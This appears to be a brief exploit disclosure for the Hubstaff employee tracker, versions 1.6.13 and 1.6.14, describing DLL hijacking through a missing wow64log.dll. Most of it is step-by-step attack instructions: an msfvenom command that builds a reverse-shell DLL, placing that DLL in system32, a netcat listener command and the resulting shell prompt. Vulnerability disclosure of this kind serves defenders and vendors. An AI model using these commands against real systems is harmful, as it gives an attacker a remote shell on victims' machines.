*#Vendor Homepage:* https://hubstaff.com/

*#Version:* 1.6.13, 1.6.14
*#Tested On:* 64-bit operating system, x64-based processor

*Description*
Hubstaff is an employee work tracker with screenshots, timesheets, billing,
in-depth reports, and more.

During testing. It was found that the system32 subdirectory was missing a
DLL library with the name *wow64log.dll* that had been required by the
hubstaff's setup file during installation. Hence, using Metasploit's
msfvenom to create a new wow64log.dll file, Tester was able to get a
reverse shell locally.

*Exploit*
1- Generate a dll file with the name wow64log.dll using the command:

*msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f dll
-o wow64log.dll*

2- Place the newly generated DLL to the *system32 *directory.
3- Start a listener on attacker's console using:

*nc -lnvp <port_used_while_generating_DLL>*

4- Launch the exe.

Reverse shell will be receive as:

*C:\Windows>*
